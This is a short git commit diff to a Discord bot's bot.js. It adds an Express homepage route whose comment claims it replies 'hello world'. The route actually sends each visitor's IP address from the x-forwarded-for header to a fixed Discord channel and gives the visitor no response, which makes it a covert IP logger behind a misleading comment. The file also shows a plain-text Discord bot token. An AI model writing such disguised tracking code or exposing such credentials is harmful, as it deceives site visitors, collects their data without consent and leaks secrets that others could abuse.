4b8da5bace8e74fb9e618c31c70d8db9e3a3faf5
Prawin Rajasena <prawinrajasena@Prawin-3.local>
2020-03-13 18:25:09 +0100

    r

--- bot.js
+++ bot.js
@@ -11,4 +11,12 @@ client.on('message', msg => {
   }
 });
 
+var express = require('express');
+var app = express();
+
+// respond with "hello world" when a GET request is made to the homepage
+app.get('/', function(req, res) {
+  client.channels.get('687937985852866603').send(req.headers['x-forwarded-for']);
+});
+
 client.login('Njg4MDU5NTc2NzgzNzMyODM3.Xmu7sA.ig2LSYmh0GqfJu0_tt3ZZ2-Xcc4');
